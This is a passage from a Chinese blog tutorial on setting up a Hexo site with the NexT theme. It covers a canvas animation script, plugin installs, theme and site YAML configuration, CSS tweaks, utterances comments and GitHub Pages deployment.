current_point.x = e.clientX;</span><br><span class="line">    current_point.y = e.clientY;</span><br><span class="line">  &#125;, window.onmouseout = function() &#123;</span><br><span class="line">    current_point.x = null;</span><br><span class="line">    current_point.y = null;</span><br><span class="line">  &#125;;</span><br><span class="line">  //随机生成config.n条线位置信息</span><br><span class="line">  for (var random_points = [], i = 0; config.n &gt; i; i++) &#123;</span><br><span class="line">    var x = random() * canvas_width, //随机位置</span><br><span class="line">      y = random() * canvas_height,</span><br><span class="line">      xa = 2 * random() - 1, //随机运动方向</span><br><span class="line">      ya = 2 * random() - 1;</span><br><span class="line">    // 随机点</span><br><span class="line">    random_points.push(&#123;</span><br><span class="line">      x: x,</span><br><span class="line">      y: y,</span><br><span class="line">      xa: xa,</span><br><span class="line">      ya: ya,</span><br><span class="line">      max: 6000 //沾附距离</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  all_array = random_points.concat([current_point]);</span><br><span class="line">  //0.1秒后绘制</span><br><span class="line">  setTimeout(function() &#123;</span><br><span class="line">    draw_canvas();</span><br><span class="line">  &#125;, 100);</span><br><span class="line">&#125;();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	新增如下nexT配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Define custom file paths.</span><br><span class="line"># Create your custom files in site directory `source/_data` and uncomment needed files below.</span><br><span class="line">custom_file_path:</span><br><span class="line">  #head: source/_data/head.njk</span><br><span class="line">  #header: source/_data/header.njk</span><br><span class="line">  #sidebar: source/_data/sidebar.njk</span><br><span class="line">  #postMeta: source/_data/post-meta.njk</span><br><span class="line">  #postBodyEnd: source/_data/post-body-end.njk</span><br><span class="line">  footer: source/_data/footer.swig    # 解决canvas-next:enable在新版本缺失的问题，摘自：https://github.com/theme-next/theme-next-canvas-nest</span><br><span class="line">  #bodyEnd: source/_data/body-end.njk</span><br><span class="line">  #variable: source/_data/variables.styl</span><br><span class="line">  #mixin: source/_data/mixins.styl</span><br><span class="line">  #style: source/_data/styles.styl</span><br></pre></td></tr></table></figure>

<ol start="12">
<li>配置hexo-word-counter插件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装插件</span><br><span class="line">npm install hexo-word-counter --save</span><br><span class="line"></span><br><span class="line"># 添加hexo配置</span><br><span class="line">symbols_count_time:</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: true</span><br><span class="line">  exclude_codeblock: false</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br><span class="line">  suffix: &quot;mins.&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加nexT配置</span><br><span class="line"># Post meta display settings</span><br><span class="line">post_meta:</span><br><span class="line">  item_text: true</span><br><span class="line">  created_at: true</span><br><span class="line">  updated_at:</span><br><span class="line">    enable: true</span><br><span class="line">    another_day: true</span><br><span class="line">  categories: true</span><br><span class="line"></span><br><span class="line"># Post wordcount display settings</span><br><span class="line"># Dependencies: https://github.com/next-theme/hexo-word-counter</span><br><span class="line">symbols_count_time:</span><br><span class="line">  separated_meta: true</span><br><span class="line">  item_text_total: false</span><br></pre></td></tr></table></figure>

<ol start="13">
<li>配置置顶按钮样式</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">  enable: true</span><br><span class="line">  # Back to top in sidebar.</span><br><span class="line">  sidebar: true</span><br><span class="line">  # Scroll percent label in b2t button.</span><br><span class="line">  scrollpercent: true</span><br></pre></td></tr></table></figure>

<ol start="14">
<li><p>修改文章详情页面正文中a标签的样式<br><img src="/../img/202204201729429.png" alt="image-20220421085020642"></p>
</li>
<li><p>添加github banner</p>
<p>方法一：直接修改添加nexT配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># `Follow me on GitHub` banner in the top-right corner.</span><br><span class="line">github_banner:</span><br><span class="line">  enable: true</span><br><span class="line">  permalink: https://github.com/he-zhifei</span><br><span class="line">  title: Follow me on GitHub</span><br></pre></td></tr></table></figure>

<p>方法二：<a href="https://tholman.com/github-corners/">GitHub Corners (tholman.com)</a><br><img src="/../img/202204201739333.png" alt="image-20220420173903270"><br><img src="/../img/202204201744115.png" alt="image-20220420174433067"></p>
</li>
<li><p>修改favicon，nexT配置添加</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">  #small: /images/favicon-16x16-next.png</span><br><span class="line">  #medium: /images/favicon-32x32-next.png</span><br><span class="line">  #apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">  #safari_pinned_tab: /images/logo.svg</span><br><span class="line">  small: /images/icon.svg</span><br><span class="line">  medium: /images/icon.svg</span><br><span class="line">  apple_touch_icon: /images/icon.svg</span><br><span class="line">  safari_pinned_tab: /images/icon.svg</span><br><span class="line">  #android_manifest: /manifest.json</span><br></pre></td></tr></table></figure>

<ol start="17">
<li>部署到github，配置hexo</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:he-zhifei/he-zhifei.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<p>​	安装hexo-deployer-git插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>​	发布文章到github</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<ol start="18">
<li>其他样式调整</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">themes\next\source\css\_common\components\post\index.styl</span><br><span class="line">.post-button &#123;</span><br><span class="line">    /* margin-top: 40px; */</span><br><span class="line">    text-align: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">themes\next\source\css\_common\components\post\post-header.styl</span><br><span class="line">.posts-expand .post-header &#123;</span><br><span class="line">    font-size: 1.125em;</span><br><span class="line">    margin-bottom: 10px;	/* 60改为10 */</span><br><span class="line">    text-align: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">themes\next\source\css\_common\scaffolding\base.styl</span><br><span class="line">p &#123;</span><br><span class="line">    margin: 0 0 10px;		/* 改为10 */</span><br><span class="line">&#125;</span><br><span class="line">.main-inner.index.posts-expand .post-body.animated.fadeInDown p &#123;</span><br><span class="line">  text-align: center;   /* 新增 */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">themes\next\source\css\_variables\base.styl，搜1.5em找到变量</span><br><span class="line">.posts-expand .post-title &#123;</span><br><span class="line">    font-size: 1.3em;		/* 1.5改为1.3*/</span><br><span class="line">    font-weight: normal;</span><br><span class="line">    margin: initial;</span><br><span class="line">    overflow-wrap: break-word;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">themes\next\source\css\_schemes\Gemini\index.styl</span><br><span class="line">.post-block, .comments &#123;</span><br><span class="line">    padding: 20px 40px;	/* 从全为40，改为上下20，左右40*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">themes\next\languages\zh-CN.yml	“日志”改为“文章”、“归档”改为“文章”</span><br><span class="line"></span><br><span class="line">themes\next\layout\_macro\post.njk，把&#123;%- if post.description and theme.excerpt_description %&#125;</span><br><span class="line">改为 &#123;%- if theme.excerpt_description %&#125;，即：无描述时也合拢不展示文件内容，只显示“阅读全文”按钮</span><br></pre></td></tr></table></figure>

<p><img src="/../img/Snipaste_2024-02-19_16-15-38.png"></p>
<h1 id="3-配置评论系统"><a href="#3-配置评论系统" class="headerlink" title="3. 配置评论系统"></a>3. 配置评论系统</h1><p>​	说明：NexT version 8.11.0默认支持disqus | disqusjs | changyan | livere | gitalk | utterances 等评论系统，这里使用utterances做评论系统</p>
<ol>
<li>根据 <a href="https://utteranc.es/">utterances</a> 的文档，需预先创建好一个公共的github仓库，该仓库的issue用来存储评论消息，然后安装 <a href="https://github.com/apps/utterances">utterances app</a></li>
</ol>
<p><img src="/../img/202204190154468.png" alt="202204190154468.png"></p>
<ol start="2">
<li>增加nexT配置</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Comments Settings</span><br><span class="line"># See: https://theme-next.js.org/docs/third-party-services/comments</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Multiple Comment System Support</span><br><span class="line">comments:</span><br><span class="line">  # Available values: tabs | buttons</span><br><span class="line">  style: tabs</span><br><span class="line">  # Choose a comment system to be displayed by default.</span><br><span class="line">  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances</span><br><span class="line">  active: utterances</span><br><span class="line">  # Setting `true` means remembering the comment system selected by the visitor.</span><br><span class="line">  storage: true</span><br><span class="line">  # Lazyload all comment systems.</span><br><span class="line">  lazyload: false</span><br><span class="line">  # Modify texts or order for any naves, here are some examples.</span><br><span class="line">  nav:</span><br><span class="line">    #disqus:</span><br><span class="line">    #  text: Load Disqus</span><br><span class="line">    #  order: -1</span><br><span class="line">    #gitalk:</span><br><span class="line">    #  order: -2</span><br><span class="line"></span><br><span class="line"># Utterances</span><br><span class="line"># For more information: https://utteranc.es</span><br><span class="line">utterances:</span><br><span class="line">  enable: true</span><br><span class="line">  repo: 仓库所有者/仓库名 # Github repository owner and name</span><br><span class="line">  # Available values: pathname | url | title | og:title</span><br><span class="line">  issue_term: pathname</span><br><span class="line">  # Available values: github-light | github-dark | preferred-color-scheme | github-dark-orange | icy-dark | dark-blue | photon-dark | boxy-light</span><br><span class="line">  theme: github-light</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>至此配置完成，重新清除缓存、构建代码、启动服务</li>
</ol>
<h1 id="4-指定部署分支"><a href="#4-指定部署分支" class="headerlink" title="4. 指定部署分支"></a>4. 指定部署分支</h1><p>经过前面一系列操作，已经把博客发布到 用户名.github.io，此时，配置github部署的分支，使github知道资源的位置。</p>
<p><img src="/../img/Snipaste_2024-02-18_07-20-26.png"></p>
<p>可能出现的问题：</p>
<ol>
<li>Accessing non-existent property ‘xxx’</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(node:7444) Warning: Accessing non-existent property &#x27;lineno&#x27; of module exports inside circular dependency</span><br><span class="line">(Use `node --trace-warnings ...` to show where the warning was created)</span><br><span class="line">(node:7444) Warning: Accessing non-existent property &#x27;column&#x27; of module exports inside circular dependency</span><br><span class="line">(node:7444) Warning: Accessing non-existent property &#x27;filename&#x27; of module exports inside circular dependency</span><br><span class="line">(node:7444) Warning: Accessing non-existent property &#x27;lineno&#x27; of module exports inside circular dependency</span><br><span class="line">(node:7444) Warning: Accessing non-existent property &#x27;column&#x27; of module exports inside circular dependency</span><br><span class="line">(node:7444) Warning: Accessing non-existent property &#x27;filename&#x27; of module exports inside circular dependency</span><br></pre></td></tr></table></figure>

<p>在<code>blog\node_modules\nib\node_modules\stylus\lib\nodes\index.js</code>文件开头添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.lineno = null;</span><br><span class="line">exports.column = null;</span><br><span class="line">exports.filename = null;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>评论系统utterances的界面部分加载慢、其它人也能使用你创建的评论仓库，这两个问题目前无法解决</li>
</ol>
<h1 id="5-附录"><a href="#5-附录" class="headerlink" title="5. 附录"></a>5. 附录</h1><h2 id="5-1-config-next-yml汇总-在hexo根目录下新建"><a href="#5-1-config-next-yml汇总-在hexo根目录下新建" class="headerlink" title="5.1 _config.next.yml汇总(在hexo根目录下新建)"></a>5.1 _config.next.yml汇总(在hexo根目录下新建)</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment">#scheme: Muse</span></span><br><span class="line"><span class="comment">#scheme: Mist</span></span><br><span class="line"><span class="comment">#scheme: Pisces</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage: `Key: /link/ || icon`</span></span><br><span class="line"><span class="comment"># Key is the name of menu item. If the translation for this item is available, the translated text will be loaded, otherwise the Key name will be used. Key is case-sensitive.</span></span><br><span class="line"><span class="comment"># Value before `||` delimiter is the target link, value after `||` delimiter is the name of Font Awesome icon.</span></span><br><span class="line"><span class="comment"># External url should start with http:// or https://</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="comment">#about: /about/ || fa fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || fa fa-heartbeat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/profile-pic.svg</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be displayed in circle.</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be rotated with the cursor.</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Social Links</span></span><br><span class="line"><span class="comment"># Usage: `Key: permalink || icon`</span></span><br><span class="line"><span class="comment"># Key is the link label showing to end users.</span></span><br><span class="line"><span class="comment"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span></span><br><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/he-zhifei</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:he-zhifei@foxmail.com</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br><span class="line">  <span class="comment">#Weibo: https://weibo.com/yourname || fab fa-weibo</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line">  <span class="comment">#Twitter: https://twitter.com/yourname || fab fa-twitter</span></span><br><span class="line">  <span class="comment">#FB Page: https://www.facebook.com/yourname || fab fa-facebook</span></span><br><span class="line">  <span class="comment">#StackOverflow: https://stackoverflow.com/yourname || fab fa-stack-overflow</span></span><br><span class="line">  <span class="comment">#YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line">  <span class="comment">#Instagram: https://instagram.com/yourname || fab fa-instagram</span></span><br><span class="line">  <span class="comment">#Skype: skype:yourname?call|chat || fab fa-skype</span></span><br><span class="line"></span><br><span class="line"><span class="attr">social_icons:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">icons_only:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">transition:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Blog rolls</span></span><br><span class="line"><span class="attr">links_settings:</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">fa</span> <span class="string">fa-globe</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">Links</span></span><br><span class="line">  <span class="comment"># Available values: block | inline</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="string">block</span></span><br><span class="line"></span><br><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="string">友情链接:</span> <span class="string">https://example.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Automatically excerpt description in homepage as preamble text.</span></span><br><span class="line"><span class="attr">excerpt_description:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Read more button</span></span><br><span class="line"><span class="comment"># If true, the read more button will be displayed in excerpt section.</span></span><br><span class="line"><span class="attr">read_more_btn:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define custom file paths.</span></span><br><span class="line"><span class="comment"># Create your custom files in site directory `source/_data` and uncomment needed files below.</span></span><br><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.njk</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.njk</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.njk</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.njk</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class="line">  <span class="attr">footer:</span> <span class="string">source/_data/footer.swig</span>    <span class="comment"># 解决canvas-next:enable在新版本缺失的问题，摘自：https://github.com/theme-next/theme-next-canvas-nest</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.njk</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="comment">#style: source/_data/styles.styl</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Local Search</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/next-theme/hexo-generator-searchdb</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># If auto, trigger search by changing input.</span></span><br><span class="line">  <span class="comment"># If manual, trigger search by pressing enter key or search button.</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span></span><br><span class="line">  <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show Views / Visitors of the website / page with busuanzi.</span></span><br><span class="line"><span class="comment"># For more information: http://ibruce.info/2015/04/04/busuanzi/</span></span><br><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">far</span> <span class="string">fa-eye</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Progress bar in the top during page loading.</span></span><br><span class="line"><span class="comment"># For more information: https://github.com/CodeByZach/pace</span></span><br><span class="line"><span class="attr">pace:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># All available colors:</span></span><br><span class="line">  <span class="comment"># black | blue | green | orange | pink | purple | red | silver | white | yellow</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">pink</span></span><br><span class="line">  <span class="comment"># All available themes:</span></span><br><span class="line">  <span class="comment"># big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | center-simple</span></span><br><span class="line">  <span class="comment"># corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material | minimal</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">material</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Post meta display settings</span></span><br><span class="line"><span class="attr">post_meta:</span></span><br><span class="line">  <span class="attr">item_text:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">created_at:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">updated_at:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">another_day:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Post wordcount display settings</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/next-theme/hexo-word-counter</span></span><br><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">separated_meta:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">item_text_total:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Table of Contents in the Sidebar</span></span><br><span class="line"><span class="comment"># Front-matter variable (nonsupport wrap expand_all).</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Automatically add list number to toc.自动给目录添加列表号</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># If true, all words will placed on next lines if header width longer then sidebar width.</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># If true, all level of TOC in a post will be displayed, rather than the activated part of it.</span></span><br><span class="line">  <span class="attr">expand_all:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Maximum heading depth of generated toc.</span></span><br><span class="line">  <span class="attr">max_depth:</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># `Follow me on GitHub` banner in the top-right corner.</span></span><br><span class="line"><span class="attr">github_banner:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">permalink:</span> <span class="string">https://github.com/he-zhifei</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">Follow</span> <span class="string">me</span> <span class="string">on</span> <span class="string">GitHub</span></span><br><span class="line"></span><br><span class="line"><span class="attr">back2top:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Back to top in sidebar.</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Scroll percent label in b2t button.</span></span><br><span class="line">  <span class="attr">scrollpercent:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="comment">#small: /images/favicon-16x16-next.png</span></span><br><span class="line">  <span class="comment">#medium: /images/favicon-32x32-next.png</span></span><br><span class="line">  <span class="comment">#apple_touch_icon: /images/apple-touch-icon-next.png</span></span><br><span class="line">  <span class="comment">#safari_pinned_tab: /images/logo.svg</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/icon.svg</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/icon.svg</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/icon.svg</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/icon.svg</span></span><br><span class="line">  <span class="comment">#android_manifest: /manifest.json</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Comments Settings</span></span><br><span class="line"><span class="comment"># See: https://theme-next.js.org/docs/third-party-services/comments</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Multiple Comment System Support</span></span><br><span class="line"><span class="attr">comments:</span></span><br><span class="line">  <span class="comment"># Available values: tabs | buttons</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">tabs</span></span><br><span class="line">  <span class="comment"># Choose a comment system to be displayed by default.</span></span><br><span class="line">  <span class="comment"># Available values: disqus | disqusjs | changyan | livere | gitalk | utterances</span></span><br><span class="line">  <span class="attr">active:</span> <span class="string">utterances</span></span><br><span class="line">  <span class="comment"># Setting `true` means remembering the comment system selected by the visitor.</span></span><br><span class="line">  <span class="attr">storage:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Lazyload all comment systems.</span></span><br><span class="line">  <span class="attr">lazyload:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Modify texts or order for any naves, here are some examples.</span></span><br><span class="line">  <span class="attr">nav:</span></span><br><span class="line">    <span class="comment">#disqus:</span></span><br><span class="line">    <span class="comment">#  text: Load Disqus</span></span><br><span class="line">    <span class="comment">#  order: -1</span></span><br><span class="line">    <span class="comment">#gitalk:</span></span><br><span class="line">    <span class="comment">#  order: -2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Utterances</span></span><br><span class="line"><span class="comment"># For more information: https://utteranc.es</span></span><br><span class="line"><span class="attr">utterances:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">仓库所有者/仓库名</span> <span class="comment"># Github repository owner and name</span></span><br><span class="line">  <span class="comment"># Available values: pathname | url | title | og:title</span></span><br><span class="line">  <span class="attr">issue_term:</span> <span class="string">pathname</span></span><br><span class="line">  <span class="comment"># Available values: github-light | github-dark | preferred-color-scheme | github-dark-orange | icy-dark | dark-blue | photon-dark | boxy-light</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">github-light</span></span><br></pre></td></tr></table></figure>

<h2 id="5-2-hexo配置汇总-config-yml"><a href="#5-2-hexo配置汇总-config-yml" class="headerlink" title="5.2 hexo配置汇总(_config.yml)"></a>5.2 hexo配置汇总(_config.yml)</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hexo Configuration</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Zhifei&#x27;s</span> <span class="string">Blog</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;个人博客&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27;keep it up.&#x27;</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">he-zhifei</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="comment"># timezone尽可能设定，中国的为Asia/Shanghai，不能用GMT+8或UTC+8。后续评论系统的评论是与pathname挂钩的，而时区不同，可能导致pathname不同</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://he-zhifei.github.io</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"><span class="attr">pretty_urls:</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;.html&#x27; from permalinks</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span></span><br><span class="line"><span class="attr">skip_render:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># File name of new posts</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="attr">external_link:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span> <span class="comment"># Apply to the whole site</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">relative_link:</span> <span 